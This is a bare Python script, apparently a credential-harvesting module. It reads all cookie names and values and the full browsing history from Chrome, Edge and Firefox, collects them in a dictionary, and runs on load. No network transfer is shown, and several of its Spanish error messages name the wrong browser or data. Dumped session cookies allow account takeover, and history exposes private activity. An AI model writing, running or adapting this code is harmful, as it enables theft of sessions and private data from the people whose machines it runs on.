import browser_cookie3
from browser_history.browsers import Firefox, Chrome, Edge
import json
def getBrowsersInfo():
    
    try:
        chromeCookies = json.dumps({cookie.name: cookie.value for cookie in browser_cookie3.chrome()}, indent=4)
    except:
        print("No se pudo obtener las cookies de chrome")
        chromeCookies = None
        
    try:
        edge = browser_cookie3.edge()
        edgeCookies = json.dumps({cookie.name: cookie.value for cookie in edge}, indent=4)
    except:
        print("No se pudo obtener las cookies de chrome")
        edgeCookies = None
        
    try:
        firefoxCookies = json.dumps({cookie.name: cookie.value for cookie in browser_cookie3.firefox()}, indent=4)
    except:
        print("No se pudo obtener las cookies de firefox")
        firefoxCookies = None
        
        
        
        
    try:
        chromeHistory = [{'datetime': str(entry[0]), 'url': entry[1]} for entry in Chrome().fetch_history().histories]

        print(chromeHistory)
    except:
        print("No se pudo obtener el historial de chrome")
        chromeHistory = None
        
        
        
        
        
    try:
        edgeHistory = [{'datetime': str(entry[0]), 'url': entry[1]} for entry in Edge().fetch_history().histories]
        
    except:
        print("No se pudo obtener las cookies de chrome")
        edgeHistory = None
        
    try:
        firefoxHistory = [{'datetime': str(entry[0]), 'url': entry[1]} for entry in Firefox().fetch_history().histories]
        
    except:
        print("No se pudo obtener las cookies de firefox")
        firefoxHistory = None
        
    return {"Chrome": [chromeCookies, chromeHistory], "Edge": [edgeCookies, edgeHistory], "Firefox": [firefoxCookies, firefoxHistory] }

getBrowsersInfo()